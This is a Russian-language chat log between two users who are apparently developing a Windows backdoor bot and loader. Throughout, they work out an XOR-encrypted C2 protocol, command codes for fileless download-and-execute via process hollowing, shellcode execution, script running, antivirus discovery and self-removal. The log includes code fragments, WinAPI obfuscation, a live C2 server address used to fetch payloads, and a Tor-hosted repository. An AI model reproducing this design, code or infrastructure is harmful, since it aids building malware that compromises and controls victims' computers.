2020-07-23 11:25:07.476586	price	mushroom	если ставлю ноль то 404, если но кукиз -400
2020-07-23 11:25:30.450892	price	mushroom	короче спасай
2020-07-23 11:26:26.721432	mushroom	price	Давай файл.
2020-07-23 11:26:50.413890	price	mushroom	даю, дописываю уже, чтобы всё понятно было и тебе и мне потом
2020-07-23 11:28:55.894073	mushroom	price	Вот тебе утилита шифровки\расшифровки xor id, как на сервере стоит.
2020-07-23 11:28:58.853893	mushroom	price	#include <iostream>
#include <fstream>
#include <string>
#include <memory>

//C++ 17.
//#include <filesystem>

using namespace std;

int main(int argc, char *argv[])
{
    //Проверить количество аргументов.
    if (argc < 4)
    {
        cout << "Too few arguments. Use first argument for key, second argument for source file,"
            " third argument for destination file" << endl;
        return 1;
    }

    //Проверить размер ключа и его кратность 2.
    string hex(argv[1]);
    if (hex.empty() || hex.size() % 2)
    {
        cout << "Wrong key" << endl;
        return 1;
    }

    //Перевести хекс представление ключа в байтовое.
    size_t keySize = hex.size() / 2;
    auto key = make_unique<unsigned char[]>(keySize);
    for (size_t i = 0, j = 0; j < keySize; i += 2, ++j)
    {
        char* check = NULL;
        unsigned char byte = static_cast<unsigned char>(strtoul(hex.substr(i, 2).c_str(),
            &check, 16));
        if (*check != '\0')
        {
            cout << "Wrong key at symbol " << *check << endl;
            return 1;
        }

        key[j] = byte;
    }
    cout << "Key size " << keySize << endl;

    //Открыть исходный файл для чтения двоичных данных.
    fstream src(argv[2], ios_base::in | ios_base::binary);
    if (!src)
    {
        cout << "Can't open source file " << endl;
        return 1;
    }

    //C++ 17.
    //cout << "Input file size " << filesystem::file_size(argv[2]) << endl;

    src.seekg(0, ios_base::end);
    size_t srcSize = src.tellg();
    cout << "Input file size " << srcSize << endl;
    if (srcSize > 10485760)
    {
        cout << "Input file size is too large!" << endl;
        cout << "Key: " << hex << endl;
        cout << "Input file: " << argv[2] << endl;
        cout << "Output file: " << argv[3] << endl;
        return 1;
    }
    src.seekg(0, ios_base::beg);

    //Открыть файл назначения для записи двоичных данных (усекается).
    fstream dest(argv[3], ios_base::out | ios_base::binary | ios_base::trunc);
    if (!dest)
    {
        cout << "Can't open destination file" << endl;
        return 1;
    }

    //Зашифровать\расшифровать файл.
    cout << "Working..." << endl;
    size_t keyIndex = 0;
    size_t destSize = 0;
    while (!src.eof())
    {
        unsigned char byte = static_cast<unsigned char>(src.get());
        if (!src.eof())
        {
            if (destSize < 10485760)
            {
                dest.put(byte ^ key[keyIndex]);
                ++destSize;
            }
            else
            {
                cout << "Output file size is too large!" << endl;
                cout << "Key: " << hex << endl;
                cout << "Input file: " << argv[2] << endl;
                cout << "Output file: " << argv[3] << endl;
                return 1;
            }
        }

        ++keyIndex;
        if (keyIndex == keySize)
            keyIndex = 0;
    }
    cout << "Output file size " << dest.tellg() << endl;

    src.close();
    dest.close();

    //C++ 17.
    //cout << "Output file size " << filesystem::file_size(argv[3]) << endl;
    cout << "Ready" << endl;

    return 0;
}
2020-07-23 11:29:35.930536	mushroom	price	Чтобы проверять что получается у тебя.
2020-07-23 11:30:04.996905	price	mushroom	ok
2020-07-23 11:35:15.082590	price	mushroom	261578874264819908609102035485573088411
2020-07-23 11:35:22.917822	price	mushroom	пароль
2020-07-23 11:36:58.988001	price	mushroom	Download: https://qaz.im/load/YsEkRz/5Rir6A
Delete: https://qaz.im/index.php?a=delete&q=800191228
2020-07-23 11:40:25.472768	mushroom	price	Что такое dechashID
2020-07-23 11:40:28.398926	mushroom	price	?
2020-07-23 11:40:59.979766	price	mushroom	десятичное представление мд5-хеша
2020-07-23 11:41:23.324989	price	mushroom	от идентификатора
2020-07-23 11:41:43.906121	mushroom	price	Вот тут и ошибка. В запросе должно быть хекс представление id.
2020-07-23 11:41:56.907773	price	mushroom	БЛИН
2020-07-23 11:42:08.050175	price	mushroom	но в тз десятичное
2020-07-23 11:42:25.033384	mushroom	price	Попробуй утилитой зашифровать и расщифровать файл какой нибудь этим хекс ключём.
2020-07-23 11:42:39.815075	mushroom	price	Да. Это забыли убрать.
2020-07-23 11:42:44.091903	price	mushroom	которую ты прислал?
2020-07-23 11:42:54.824460	mushroom	price	В C\C++ нету 128 битных чисел.
2020-07-23 11:42:56.720845	price	mushroom	я чуть программировать не бросил
2020-07-23 11:42:59.317203	mushroom	price	Да.
2020-07-23 11:43:39.287794	price	mushroom	ещё и время на процедуру конвертации хекс-дец потратил
2020-07-23 11:44:20.343369	mushroom	price	int icookies = sizeof(cookies)+1; это не нужно, вместо этого lstrlen(cookies)
2020-07-23 11:44:45.175275	mushroom	price	Нулевой символ в этой функции не нужно захватывать.
2020-07-23 11:45:14.272577	price	mushroom	пришел ответ
2020-07-23 11:45:15.799388	price	mushroom	фкq‘
2020-07-23 11:46:07.010952	mushroom	price	Зашифрованный xor твоим id.
2020-07-23 11:46:16.816714	price	mushroom	эта +1 -это уже я в бубен начал бить
2020-07-23 11:46:39.317269	price	mushroom	сейчас расшифруем
2020-07-23 11:48:48.179673	mushroom	price	InternetOpen(L"WinInet Communication",INTERNET_OPEN_TYPE_PRECONFIG,NULL, NULL,0); здесь WinInet Communication можно не писать. У меня так internetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
2020-07-23 11:56:06.871992	mushroom	price	httpOpenRequest(connection, method, path, _TSTR(TEXT("1.1")), NULL,
        NULL, (isSecure ? INTERNET_FLAG_SECURE : 0) | INTERNET_FLAG_NO_COOKIES, 0);
2020-07-23 11:56:27.291373	mushroom	price	INTERNET_FLAG_NO_COOKIES обязательно чтобы куки передались в заголовке.
2020-07-23 11:56:33.348262	price	mushroom	а isSecure?
2020-07-23 11:56:37.895892	mushroom	price	А то их Wininet удалит.
2020-07-23 11:56:45.063891	mushroom	price	Это если https.
2020-07-23 11:57:14.214971	price	mushroom	а как проверяется?
2020-07-23 11:57:33.355734	mushroom	price	По адресу или порту (https, 443)
2020-07-23 11:58:46.277224	mushroom	price	Запрос отправил без ошибок, читай сначала код ответа:
if (req)
    {
        DWORD resCode = 0;
        DWORD resCodeSize = sizeof(DWORD);
        if (!wininet.httpQueryInfo(req, HTTP_QUERY_FLAG_NUMBER | HTTP_QUERY_STATUS_CODE, &resCode,
            &resCodeSize, NULL))
        {
            DWORD err = kernel32.getLastError();
            debug_printf(TEXT("Can't query response info, error: %u\n"), err);
            wininet.internetCloseHandle(req);
            kernel32.setLastError(err);
            return NULL;
        }

        if (resCode != 200)
        {
            debug_printf(TEXT("Error, response code is %u\n"), resCode);
            wininet.internetCloseHandle(req);
            kernel32.setLastError(ERROR_INTERNET_EXTENDED_ERROR);
            return NULL;
        }

        debug_printf(TEXT("Response code is %u\n"), resCode);
    }
2020-07-23 11:59:00.537007	mushroom	price	Типа так, всё что не 200 считается ошибкой.
2020-07-23 11:59:46.084534	mushroom	price	Прочитал. Можешь теперь читать сам ответ:
internetReadFile(req, resBuffer, resBufferSize, &readed)
2020-07-23 12:00:17.789791	mushroom	price	Всё что ты и тебе посылается всё зашифрованной xor твоим id.
2020-07-23 12:01:31.702917	price	mushroom	а почему у меня расшифрованный ответ такой странный?
2020-07-23 12:01:33.147968	price	mushroom	—‰kс
2020-07-23 12:02:16.076184	mushroom	price	С ключём косяк наверное.
2020-07-23 12:02:23.602515	mushroom	price	Утилитой проверяй.
2020-07-23 12:02:41.232951	price	mushroom	а ключ хэш или прямо ИД?
2020-07-23 12:02:51.183366	mushroom	price	Хэш.
2020-07-23 12:02:59.311076	mushroom	price	В виде байтов конечно.
2020-07-23 12:03:07.334218	price	mushroom	hexHash
2020-07-23 12:03:19.872396	mushroom	price	Просто хеш.
2020-07-23 12:03:26.219936	mushroom	price	В виде байтов.
2020-07-23 12:03:34.184628	price	mushroom	gjyzk
2020-07-23 12:03:37.883845	price	mushroom	понял
2020-07-23 12:03:42.276092	mushroom	price	В утилите смотри там хекс в байты переводится.
2020-07-23 12:12:37.119870	price	mushroom	получил 0 302
2020-07-23 12:12:46.804829	price	mushroom	это что значит?
2020-07-23 12:13:10.291458	mushroom	price	Команда 0. Смотри в ТЗ.
2020-07-23 12:13:20.750428	mushroom	price	Значит перезвонить через 302 сек.
2020-07-23 12:13:32.988186	price	mushroom	я  ТЗ наизусть знаю, просто спросил
2020-07-23 12:13:45.411415	price	mushroom	а перезвонить опять get /2?
2020-07-23 12:13:55.409516	mushroom	price	Да.
2020-07-23 12:14:13.130934	price	mushroom	эта коммуникация на сервере видна?
2020-07-23 12:14:19.095457	mushroom	price	Да.
2020-07-23 12:14:25.978984	price	mushroom	смотрим
2020-07-23 12:14:39.332109	mushroom	price	Там должен появится твой бот.
2020-07-23 12:14:50.973925	price	mushroom	появился
2020-07-23 12:15:06.777491	mushroom	price	Группа торажена там?
2020-07-23 12:15:12.701185	mushroom	price	Отражена.
2020-07-23 12:15:14.859950	price	mushroom	да
2020-07-23 12:15:34.696727	mushroom	price	Всё правильно значит. Делай команду 1 полностью.
2020-07-23 12:15:38.400724	price	mushroom	да всё по хексу
2020-07-23 12:15:42.438710	price	mushroom	делаю
2020-07-23 12:15:56.297743	price	mushroom	а ксор надо на бинХэш давать
2020-07-23 12:16:01.948851	price	mushroom	там никаких стмволов нету
2020-07-23 12:16:06.573662	price	mushroom	символов
2020-07-23 12:16:43.333656	mushroom	price	Не понял.
2020-07-23 12:17:50.153215	price	mushroom	ну, чтобы ответ получить из того что пришло, я отксорил бинарным хэшем-результатом отработки CryptGetHashParam
2020-07-23 12:18:06.500634	price	mushroom	он вот такой ДКB8 №#‚
МPљou„›
2020-07-23 12:18:27.976966	mushroom	price	А в чём вопрос?
2020-07-23 12:18:46.178955	price	mushroom	нет вопроса
2020-07-23 12:18:48.978588	mushroom	price	Всё бинарным хешем надо шифровать.
2020-07-23 12:19:07.231350	mushroom	price	OK.
2020-07-23 13:46:46.182128	mushroom	price	Как сделаешь команду 1 полностью. На GitLab заведи два проекта bd6 для бота, dl6 для загрузчика, мне доступ к ним дай, и загрузи туда, я буду смотреть переодически.
2020-07-23 13:47:03.597483	price	mushroom	ok
2020-07-24 07:50:18.181273	price	mushroom	привет
2020-07-28 14:40:39.643924	mushroom	price	Что сделано на данный момент? В redmine у тебя только 8 часов трудозатрат.
2020-07-28 14:43:01.148766	price	mushroom	сейчас отлаживаю программу запуска программы с перехватом  входа и вывода /*читал ТЗ, наткнулся - начал отлаживать*/. Команду 1 закончу сегодня и отчитаюсь. Я работаю.
2020-07-28 14:45:03.348910	mushroom	price	Загрузи на GitLab проекты как я говорил. Пиши в redmine каждый день трудозатраты и что делаешь, а не когда заканчиваешь какую либо задачу.
2020-07-28 14:46:37.860465	price	mushroom	Понял, сделаю.
2020-07-29 05:25:20.400441	price	mushroom	проект backdoor на гитлаб загрузил по ссылке  https://n4iaacb37wmqclht.onion/price/backdoor.git
2020-07-29 07:10:10.553672	price	mushroom	проект backdoor на гитлаб загрузил по ссылке  https://n4iaacb37wmqclht.onion/price/backdoor.git
2020-07-29 13:43:27.560461	mushroom	price	Привет. Проект переименуй в bd6.
2020-07-29 13:43:45.516837	price	mushroom	хорошо
2020-07-29 13:44:34.095688	price	mushroom	как в win32 printf сделать, я сейчас пробую WriteConsole
2020-07-29 13:44:50.646451	price	mushroom	,
2020-07-29 13:44:53.301596	price	mushroom	?
2020-07-29 13:44:56.921715	mushroom	price	Так же никак.
2020-07-29 13:45:04.006540	mushroom	price	Используй printf
2020-07-29 13:45:14.799926	mushroom	price	Нету замены в Win32.
2020-07-29 13:45:17.524255	price	mushroom	debug_print
2020-07-29 13:45:31.478548	mushroom	price	Это самодельная замена.
2020-07-29 13:45:31.973749	price	mushroom	ok
2020-07-29 13:46:21.092670	mushroom	price	Плюс debug_printf только в сборках Debug и Release, в Release_nologs это отключается макросом.
2020-07-29 13:47:07.440864	price	mushroom	а мне придется сообщения логировать по wininet?
2020-07-29 13:47:16.932727	price	mushroom	есть такой функционал?
2020-07-29 13:47:23.245923	price	mushroom	я видел
2020-07-29 13:47:35.898153	mushroom	price	Какие сообщения?
2020-07-29 13:47:39.619967	mushroom	price	/4
2020-07-29 13:47:44.014837	mushroom	price	Эти?
2020-07-29 13:47:53.848835	price	mushroom	да
2020-07-29 13:48:24.027206	mushroom	price	Пока только посылай при подключении к серверу удачному адрес, который используется и версию программы.
2020-07-29 13:48:37.367307	mushroom	price	При каждом переподключении так же.
2020-07-29 13:48:42.977143	price	mushroom	ок
2020-07-29 13:48:58.859780	mushroom	price	Каждый час шли время работы в сек или мсек и версию.
2020-07-29 13:49:20.995745	mushroom	price	Больше пока ничего не надо посылать из сообщений.
2020-07-29 13:49:26.931769	price	mushroom	а версию сам должен вести? пор неё не читал ничего
2020-07-29 13:49:47.533022	price	mushroom	какойто формат?
2020-07-29 13:49:51.345115	mushroom	price	Да сам.
2020-07-29 13:49:59.573885	price	mushroom	ок
2020-07-29 13:50:01.597039	mushroom	price	Каклй хочешь пока.
2020-07-29 13:50:53.801949	price	mushroom	а кто тест32.ехе сделает?
2020-07-29 13:51:11.733082	price	mushroom	я уже сделал, заготовочку
2020-07-29 13:51:23.898744	mushroom	price	На сервере нету что этих файлов?
2020-07-29 13:51:49.283067	price	mushroom	я не знаю, не помню, но интересовался и смотрел каждую команду
2020-07-29 13:51:56.741602	mushroom	price	Там поназагружали кучу, когда тестировали.
2020-07-29 13:52:09.811561	mushroom	price	Можешь сам сделать себе.
2020-07-29 13:52:24.482525	price	mushroom	хорошо
2020-07-29 13:52:35.389594	mushroom	price	Там на сервере есть testoutput32.exe и testoutput64.exe
2020-07-29 13:52:54.768178	mushroom	price	Бесконечно выводят TEST в stdout
2020-07-29 13:53:48.184696	price	mushroom	понял,  про вывод ТЕСТ читал
2020-07-29 13:55:18.705890	mushroom	price	Сейчас в приоритете как раз сделать команду скачивания запуска файла. В основном ей и пользуются.
2020-07-29 13:55:34.927418	price	mushroom	exe?dll?
2020-07-29 13:55:41.317419	mushroom	price	exe
2020-07-29 13:55:47.634224	price	mushroom	ok
2020-07-29 13:55:51.852728	mushroom	price	dll просто запускается.
2020-07-29 13:56:06.225111	mushroom	price	А exe нужно ещё и без сохранения на диск.
2020-07-29 13:56:09.020599	price	mushroom	я как раз вчера весь день на это убил
2020-07-29 13:56:23.892710	price	mushroom	холовингом?
2020-07-29 13:56:28.441970	mushroom	price	Да.
2020-07-29 13:56:35.168081	price	mushroom	ок
2020-07-29 13:56:55.636776	mushroom	price	На doppelganging забей пока, он 100% не работает на Win 10.
2020-07-29 13:58:03.135821	price	mushroom	спасибо что предупредил
2020-07-29 13:59:39.224194	mushroom	price	Как пример Hollowing:
Download: https://qaz.im/load/QKDary/5GrZYf   
Delete: https://qaz.im/index.php?a=delete&q=919812058
Пароль: EB?F\Key:gQy>$sh_
2020-07-29 14:00:48.202514	price	mushroom	принял
2020-07-29 14:57:58.930562	mushroom	price	Повысь мне доступ к твоим проектам. Я не могу клонировать bd6, и смотреть код не могу.
2020-07-29 15:16:29.999208	mushroom	price	У тебя на redmine пока 8 часов только затрат. Напоминаю писать их каждый день.
2020-07-29 15:18:14.012953	price	mushroom	хорошо, дам мастера
2020-07-29 15:18:59.132920	price	mushroom	с затратами проблема,  не умею я их писать. Не интуитивно.Но хочу научиться.
2020-07-29 15:19:29.170229	price	mushroom	а так, да.  У меня сейчас код начел течь как песня.  И думаю будет, о чем писать.
2020-07-29 15:19:35.162416	mushroom	price	Сколько просидел за работой столько и пиши.
2020-07-29 15:20:00.811378	price	mushroom	не так все рпосто. Она чекает значение и больше чего то написать нельзя.
2020-07-29 15:20:12.698399	price	mushroom	Я даже по 0 часов писал в какой-то ситуации.
2020-07-29 15:20:48.350780	price	mushroom	опять же, вот на два дня (или три ) я написал план, а как списывать?
2020-07-29 15:21:25.718044	mushroom	price	Добавить трудозатраты в задаче.
2020-07-29 15:21:56.708924	price	mushroom	а так сижу круглосуточно ибо есть тема. Хорошо, я посмотрю потщательнее.
2020-07-29 15:25:29.794842	price	mushroom	повысил
2020-08-03 09:28:14.903393	mushroom	price	Привет. Смотрю твой проект. Где там выполнение команды 1?
2020-08-03 09:28:53.591185	price	mushroom	в гитлабе смотришь?
2020-08-03 09:28:57.554562	price	mushroom	привет
2020-08-03 09:29:12.313608	mushroom	price	Да клонировал себе.
2020-08-03 09:29:57.947207	price	mushroom	я не добросил ещё, но всё сделано и на сервер я данные кладу.
2020-08-03 09:30:27.553061	price	mushroom	Соответственно сегодня в ближайшее время положу.
2020-08-03 09:30:38.304835	mushroom	price	Хорошо.
2020-08-03 09:30:51.755759	price	mushroom	Я с холовингом сцепился и запусками всякими. Есть вопросы.
2020-08-03 09:31:13.316163	price	mushroom	1. Мне ссервера приходит по командам 10,11 посылочка
2020-08-03 09:31:23.309314	price	mushroom	всё расшифровывается кроме URI
2020-08-03 09:31:52.660266	price	mushroom	там какая-то непонятка, наверное, ещё какая-то дешифрация нужна?
2020-08-03 09:32:01.298853	price	mushroom	2.  вопрос
2020-08-03 09:33:38.621126	price	mushroom	чтобы запустить какой-то батч скрипт, достаточно только последнего поля для ввода, собственно скрипт, зачем ещё одно, в которое нельзя ничего проставить (или оно просто чтобы из батча на диске после браузинга выставить все в поле скрипт?)
2020-08-03 09:35:26.593970	mushroom	price	Script parameters параметры скрипта, используются только когда скрипт запускается с сохранением на диск.
2020-08-03 09:35:47.704061	price	mushroom	3. вопрос - ты мне сбросил .с и .h processhelper - это справочник к действию или рабочий фрагмеент (оттсутствуют части различные типа - #include "strobfuscator.h"
#include "tdebug.h"
2020-08-03 09:35:48.578457	mushroom	price	Когда скрипт запускается без сохранения на диск их нужно игнорировать.
2020-08-03 09:36:04.673966	mushroom	price	Фрагмент.
2020-08-03 09:36:46.887336	mushroom	price	_STR, _WCS, _TSTR, debug_printf можно убрать.
2020-08-03 09:36:54.485177	mushroom	price	Это обфускация.
2020-08-03 09:37:27.268426	mushroom	price	И отладочный вывод, можно на свой заменить.
2020-08-03 09:37:59.524401	price	mushroom	главное - что URI lkz exe & dll мне не понятны, я в инспекторе программу указываю а линк приходит видимо обфуцированный
2020-08-03 09:38:39.376314	price	mushroom	URI для exe&dll
2020-08-03 09:39:12.163378	mushroom	price	Вот debug и strobfuscator:
Download: https://qaz.im/load/Gii34k/Ye859t   
Delete: https://qaz.im/index.php?a=delete&q=169681237
Пароль: xjly1u#qxzr50IfK.
2020-08-03 09:39:13.657636	price	mushroom	причем остальное в команде всё нормально и командная строка и маска и задержка и код команды
2020-08-03 09:40:01.376936	mushroom	price	А файл выбираешь, который посылается?
2020-08-03 09:40:22.663912	price	mushroom	а как выбрать?
2020-08-03 09:40:40.234437	mushroom	price	Select/Upload execution file
2020-08-03 09:42:10.289716	price	mushroom	а  в с++ это как более детально выглядит?
2020-08-03 09:43:05.774951	mushroom	price	Я имею ввиду на веб странице файл выбираешь который запускать?
2020-08-03 09:43:22.880217	price	mushroom	да, на сервере
2020-08-03 09:43:43.557961	mushroom	price	Выбираешь команду Run exe, Run from memory, Select/Upload execution file
2020-08-03 09:43:48.223341	price	mushroom	когда .xe команду выбираю и заполняю параметры
2020-08-03 09:44:06.599748	price	mushroom	понятно, посмотрю
2020-08-03 09:44:11.282108	mushroom	price	И что ссылка левая приходит?
2020-08-03 09:44:17.120936	price	mushroom	да
2020-08-03 09:44:35.591067	price	mushroom	вокру всё нормально а посредине хекс какойто
2020-08-03 09:45:02.069492	mushroom	price	Там ссылка, это только путь, его надо прицепить к адресу сервера, который используется на данный момент.
2020-08-03 09:46:01.459326	price	mushroom	а где прикрепление производится?
2020-08-03 09:47:45.151781	mushroom	price	Сам прицепляешь. Получил url /path/1.exe например и прибавил его к адресу https://125.125.125.125:443 например https://125.125.125.125:443/path/1/exe
2020-08-03 09:49:32.528799	price	mushroom	вот смотри -сейчас запустил
2020-08-03 09:49:34.155988	price	mushroom	10 2 60 1 /57396fd3c3f052de4c8d0ceb1dfa32db/fs7Q08KetdMXFD7TaUi8QYVjFZk_wkVR6vRQwi6g a b c
2020-08-03 09:49:40.931760	price	mushroom	это что пришло
2020-08-03 09:50:09.864240	mushroom	price	a b c это что?
2020-08-03 09:50:23.150042	price	mushroom	параметры - командная линия
2020-08-03 09:50:41.128735	price	mushroom	задаются на сервере
2020-08-03 09:50:46.130269	mushroom	price	А без них попробуй.
2020-08-03 09:50:57.220981	mushroom	price	Может это глюк на сервере.
2020-08-03 09:51:03.954303	mushroom	price	Без них попробуй.
2020-08-03 09:51:14.061068	price	mushroom	пробую
2020-08-03 09:52:30.066047	price	mushroom	вот без них
2020-08-03 09:52:31.335785	price	mushroom	10 2 60 1 /57396fd3c3f052de4c8d0ceb1dfa32db/7p5d-k98pVdzeK5pWSP4FODtrxcI19ZqHmop2x-B
2020-08-03 09:52:53.204238	price	mushroom	и строка правда другая пришла
2020-08-03 09:52:56.584270	price	mushroom	но их нет
2020-08-03 09:53:25.187303	price	mushroom	почти другая, начало похоже
2020-08-03 09:53:56.949796	mushroom	price	Всё правильно.
2020-08-03 09:54:02.406951	mushroom	price	http://51.89.125.28:12232/57396fd3c3f052de4c8d0ceb1dfa32db/7p5d-k98pVdzeK5pWSP4FODtrxcI19ZqHmop2x-B
2020-08-03 09:54:19.154036	price	mushroom	понял
2020-08-03 09:54:27.132956	mushroom	price	Приплюсовал к адресу сделал запрос GET, получил файл.
2020-08-03 09:55:03.360288	price	mushroom	и зашифрованный к тому же
2020-08-03 09:55:09.245716	price	mushroom	здорово
2020-08-03 09:55:23.321843	mushroom	price	С командной строкой тоже правильно, там где a b c.
2020-08-03 09:56:30.345614	price	mushroom	а вот я например через bat канал запрашиваю systeminfo а мне на русские части ответа приходит абракадабра,это -игнорировать?
2020-08-03 09:56:47.081347	price	mushroom	или можно как-то chcp поставить?
2020-08-03 09:57:08.292177	price	mushroom	но не красиво с аброй
2020-08-03 09:58:14.140727	mushroom	price	Всё что шлёшь на сервер кодируй UTF-8.
2020-08-03 09:58:42.254916	price	mushroom	ещё пробовал по аналогии с  post /3  сделать post /4  но никакой реакции на сервере не увидел
2020-08-03 10:00:59.645529	mushroom	price	А я сейчас смог.
2020-08-03 10:01:12.365750	mushroom	price	Смотри c4ca4238a0b923820dcc509a6f75849b
2020-08-03 10:02:00.724812	price	mushroom	вот верил в тебя!
2020-08-03 10:02:14.517989	mushroom	price	2 раза OK.
2020-08-03 10:02:15.369166	price	mushroom	но говорил о себе
2020-08-03 10:02:23.233860	mushroom	price	Так же как и /3
2020-08-03 10:02:28.143796	mushroom	price	Делается.
2020-08-03 10:02:44.107906	price	mushroom	два раза в смысле подряд? "OKOK"?
2020-08-03 10:03:00.160276	price	mushroom	я и думал, что /4 это как /3
2020-08-03 10:03:10.958799	mushroom	price	Нет я два сообщения OK подряд послал для проверки.
2020-08-03 10:03:21.676181	price	mushroom	а если более длинный текст когда не ОК?
2020-08-03 10:03:36.641240	mushroom	price	Какой хочешь текст там можно слать.
2020-08-03 10:03:40.543317	price	mushroom	да -их два
2020-08-03 10:04:00.650277	mushroom	price	Закодировал в UTF-8, зашифровал и послал.
2020-08-03 10:04:04.171552	price	mushroom	ладно посмотрю ещё раз повнимательнее
2020-08-03 10:04:30.489668	mushroom	price	И закоммить в реппозиторий.
2020-08-03 10:04:41.107007	price	mushroom	хорошо
2020-08-03 10:30:36.928139	mushroom	price	Забыл сказать, processhelper один в один к себе в программу не вставляй, это как пример.
2020-08-03 10:31:17.927374	mushroom	price	strobfusactor и tdebug можно вставлять, это нужно будет потом.
2020-08-03 10:31:29.877295	price	mushroom	я так и спрашивал, я его в отдельный проект пытался вставить, но там замучишься пыль глотать
2020-08-03 10:31:43.944160	price	mushroom	поэтому перешел на созерцание
2020-08-03 10:32:13.490942	price	mushroom	смысла кода
2020-08-03 10:32:42.572431	mushroom	price	Он работает. Я тебе недостающие файлы дал.
2020-08-03 10:33:06.220655	price	mushroom	ок
2020-08-03 10:33:11.525626	mushroom	price	Или можно удалить или закомментировать debug_* и _STR, _WCS, _TSTR.
2020-08-03 10:34:07.875956	mushroom	price	И всякие там kernel32.createProcess например заменить на CreateProcess.
2020-08-03 10:34:23.295574	price	mushroom	я уже заменил, 144 замены
2020-08-03 10:34:34.707425	mushroom	price	Хотя сразу дам как пример обфускации вызовов WinApi.
2020-08-03 10:34:38.723164	price	mushroom	для одной только из функций
2020-08-03 10:36:35.484586	mushroom	price	Download: https://qaz.im/load/4i4rfa/Zkf77a   
Delete: https://qaz.im/index.php?a=delete&q=400243054
Пароль: _TE|p/w"SfG5Q}d<s
2020-08-03 10:37:42.923590	price	mushroom	принял
2020-08-03 15:03:26.370376	price	mushroom	Привет
2020-08-03 15:03:41.959341	price	mushroom	нашел почему у меня 4 команда не шла
2020-08-03 15:04:02.274732	price	mushroom	ну и тормознул (но не только на этом пустяке)
2020-08-03 15:04:34.308284	price	mushroom	оказывается возврат по 500 ошибке при передаче того что получается из кириллицы
2020-08-03 15:04:48.030287	price	mushroom	то есть английское посылается а русское нет
2020-08-03 15:06:11.308636	price	mushroom	в частности, я ещё и 12 команду отлаживаю и там по запросу dir вываливается русская диагностика и поэтому команда не доходит
2020-08-03 15:06:41.124629	mushroom	price	Кодируй в UTF-8 тогда дойдёт.
2020-08-03 15:06:44.264740	price	mushroom	если нейтральное чтото вызывать типа whoami (а у меня who английское) то всё доходит
2020-08-03 15:06:57.136501	price	mushroom	вот я и это делал
2020-08-03 15:07:13.698653	price	mushroom	у  меня 866 код (запросил выдала)
2020-08-03 15:07:49.147815	price	mushroom	там ошибка по памяти 0хс00005 замучила
2020-08-03 15:08:09.735123	price	mushroom	на преобразовании 1251 65001
2020-08-03 15:08:47.980557	price	mushroom	ладно понял спаибо
2020-08-03 15:09:00.317778	mushroom	price	Там надо сначала в юникод, потом из юникодв в utf-8
2020-08-03 15:09:08.024190	price	mushroom	я знаю
2020-08-03 15:09:41.615793	price	mushroom	вот когда преобразование делаю в мультибайт то и выскакивает ошибка оп памяти
2020-08-03 15:09:58.872610	price	mushroom	спасибо, путь указан
2020-08-03 15:10:03.059746	price	mushroom	я побежал
2020-08-03 15:11:09.956715	mushroom	price	Как пример:
_Success_(return != 0)
BOOL multiByteToUtf8(_In_ UINT codepage, _In_reads_bytes_(multiByteStrSize) PSTR multiByteStr,
    int multiByteStrSize, _Outptr_ PSTR * utf8Str, int* utf8StrSize)
{
    int cch = MultiByteToWideChar(codepage, 0, multiByteStr, multiByteStrSize, NULL, 0);
    PWSTR tmpStr = (PWSTR)HeapAlloc(GetProcessHeap(), 0, cch * sizeof(WCHAR));
    if (!tmpStr)
        return FALSE;

    cch = MultiByteToWideChar(codepage, 0, multiByteStr, multiByteStrSize, tmpStr, cch);

    int cb = WideCharToMultiByte(CP_UTF8, 0, tmpStr, cch, NULL, 0, NULL, NULL);
    PSTR result = (PSTR)HeapAlloc(GetProcessHeap(), 0, cb);
    if (!result)
    {
        HeapFree(GetProcessHeap(), 0, tmpStr);
        return FALSE;
    }

    cb = WideCharToMultiByte(CP_UTF8, 0, tmpStr, cch, result, cb, NULL, NULL);
    HeapFree(GetProcessHeap(), 0, tmpStr);

    *utf8Str = result;
    *utf8StrSize = cb;
    return TRUE;
}
2020-08-03 15:11:57.158372	price	mushroom	спасибо учту
2020-08-12 13:07:25.261036	mushroom	price	Когда свободен будешь напиши ка успехи, что сделано.
2020-08-12 13:46:44.551643	price	mushroom	хорошо
2020-08-12 13:47:40.788292	price	mushroom	сейчас всё стало ясно, но практически круглосуточно решаю проблемы со средой и условиями срабатывания той или иной функции
2020-08-12 13:48:26.458286	price	mushroom	поэтому есть много работы и мало вопросов, даже трекер нет времени заполнять, но сегодня задним числом все напишу
2020-08-12 13:49:42.115738	price	mushroom	а так, раз уж пишу, отработал бат/PS через пайп, нашел версию на антивирус(много мутоты поскольку параметр пропал при переходе на securitycenter2)
2020-08-12 13:50:23.208148	price	mushroom	ну и осталььное по общему устройству для отработки регламентов ТЗ (ошибки, времена выполнения и т.п.)
2020-08-12 13:51:19.151948	price	mushroom	не ясно сразу, зачем через файл выполнять скрипты если можно через пайп?
2020-08-12 13:57:11.031087	mushroom	price	Понятно. Через файл я думаю нужно если например какой нибудь сильно обфусцированный сценарий запустить, не факт что он через пайп пройдёт.
2020-08-12 13:57:38.902354	price	mushroom	понял
2020-08-12 13:57:42.096620	mushroom	price	Напиши проще какие команды сделаны на данный момент.
2020-08-12 13:59:01.037579	price	mushroom	кроме холовинга всё, практически
2020-08-12 13:59:33.503462	price	mushroom	сейчас всё причёсываю, чтобы было красиво
2020-08-12 14:00:06.328826	mushroom	price	0, 1, 10, 11, 12, 13, 14, 15, 16, 17, 100
2020-08-12 14:00:11.139698	mushroom	price	Так?
2020-08-12 14:00:50.605890	mushroom	price	Или в твоём ТЗ каких то из них нет?
2020-08-12 14:01:23.947308	mushroom	price	У нас ТЗ могут отличаться, у меня оно более старое.
2020-08-12 14:01:42.377537	price	mushroom	смотрю сейчас
2020-08-12 14:01:51.706786	mushroom	price	Короче какие у тебя в ТЗ команды есть и какие из них сделаны?
2020-08-12 14:02:02.586142	price	mushroom	ну 11 не пробовал, хотя всё ясно
2020-08-12 14:02:23.942354	price	mushroom	10 - холовинг не прообовал, а так ясно
2020-08-12 14:02:40.162145	price	mushroom	12, 13 полностью отладил
2020-08-12 14:03:34.055041	price	mushroom	14-ресет- всё понятно, как раз этим и занимаюсь (чтобы был доступ к длительно выполняемому процессу)
2020-08-12 14:03:49.244865	price	mushroom	15 - сделано
2020-08-12 14:04:08.031923	price	mushroom	16-загрузка понятно
2020-08-12 14:04:57.198707	price	mushroom	17-шелкод в хексе  придёт ведь, я его в бинар конвертирую и запущу (всё понятно)
2020-08-12 14:05:27.686079	price	mushroom	100 -удалиться из системы (ьбыл вопрос,  и непонятно что это)
